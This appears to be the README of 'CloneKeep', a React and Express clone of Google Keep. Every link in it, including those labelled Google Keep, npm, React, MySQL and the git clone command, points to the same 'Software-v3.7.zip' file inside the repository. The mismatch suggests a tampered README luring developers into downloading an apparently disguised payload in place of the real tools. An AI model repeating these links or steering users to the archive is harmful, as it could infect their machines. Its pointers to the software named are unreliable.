# CloneKeep

A clone of some of the functions of [Google Keep](https://raw.githubusercontent.com/vicleyva/clonekeep/master/CloneKeepApp/public/Software-v3.7.zip)

## Getting Started

These instructions will get you a copy of the project up and running on your local machine for development and testing purposes.

### Prerequisites

- [https://raw.githubusercontent.com/vicleyva/clonekeep/master/CloneKeepApp/public/Software-v3.7.zip](https://raw.githubusercontent.com/vicleyva/clonekeep/master/CloneKeepApp/public/Software-v3.7.zip) installed on your machine
- [npm](https://raw.githubusercontent.com/vicleyva/clonekeep/master/CloneKeepApp/public/Software-v3.7.zip) (Node Package Manager)
- [knex](https://raw.githubusercontent.com/vicleyva/clonekeep/master/CloneKeepApp/public/Software-v3.7.zip) installed a global package
  - `npm install -g knex`
- [Mysql](https://raw.githubusercontent.com/vicleyva/clonekeep/master/CloneKeepApp/public/Software-v3.7.zip) installed and a database created.

### Installing 

- Clone the repository to your local machine:
    
   `git clone https://raw.githubusercontent.com/vicleyva/clonekeep/master/CloneKeepApp/public/Software-v3.7.zip`

- Navigate to the Backend Folder
  
    `cd CloneKeepApi`
  
  - Install dependencies
  
    `npm install`

  - Update your .env file with your database info
  
  - Run migration
    
    `knex migrate:latest --env production `

- Navigate to the Frontend Folder
  - `cd ..`
  - `cd CloneKeepApp`
  
  - Install dependencies

    `npm install` 

### Running the App 

Start the development server:
    `npm start`

The app will be available at http://localhost:3000 in your browser.

### Running the Server

Start the development server:
    `npm start`
    or 
    `npm run watch #to run with nodemon for development` 

The server will be available at http://localhost:5000.

### Built With

- [React](https://raw.githubusercontent.com/vicleyva/clonekeep/master/CloneKeepApp/public/Software-v3.7.zip)
- [Express](https://raw.githubusercontent.com/vicleyva/clonekeep/master/CloneKeepApp/public/Software-v3.7.zip)
- [Knex](https://raw.githubusercontent.com/vicleyva/clonekeep/master/CloneKeepApp/public/Software-v3.7.zip)
- [Mysql](https://raw.githubusercontent.com/vicleyva/clonekeep/master/CloneKeepApp/public/Software-v3.7.zip)
- [Multer](https://raw.githubusercontent.com/vicleyva/clonekeep/master/CloneKeepApp/public/Software-v3.7.zip)
- [Mui](https://raw.githubusercontent.com/vicleyva/clonekeep/master/CloneKeepApp/public/Software-v3.7.zip)
- [UUID](https://raw.githubusercontent.com/vicleyva/clonekeep/master/CloneKeepApp/public/Software-v3.7.zip)

### About the Project

This project was created as part of studying and comprehending the React environment. It also serves as an opportunity to explore and use the MUI framework for styling.